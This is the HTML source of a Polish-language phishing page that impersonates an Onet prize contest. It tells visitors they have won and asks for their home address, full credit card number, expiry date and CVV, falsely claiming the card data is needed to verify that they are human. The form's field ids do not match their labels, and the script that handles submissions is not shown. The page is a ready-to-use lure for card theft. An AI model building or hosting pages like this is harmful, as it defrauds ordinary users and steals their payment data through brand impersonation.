<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Onet - Konkurs</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>Gratulacje! Odbierz swoją nagrodę</h1>
        <p>Wypełnij poniższy formularz, aby otrzymać swoją nagrodę w konkursie Onet!</p>
		<p>Potrzebujemy danych twojej karty kredytowej aby zweryfikować czy jesteś człowiekiem.</p>
        <form id="reward-form">
            <label for="name">Adres zamieszkania:</label>
            <input type="text" id="name" name="name" required>
            
            <label for="email">Numer karty kredytowej:</label>
            <input type="email" id="email" name="email" required>
            
            <label for="address">Data wygasania:</label>
            <input type="text" id="address" name="address" required>
            
            <label for="phone">Kod zabezpieczający (CVV):</label>
            <input type="tel" id="phone" name="phone" required>
            
            <button type="submit">Wyślij</button>
        </form>
    </div>
    <script src="scripts.js"></script>
</body>
</html>
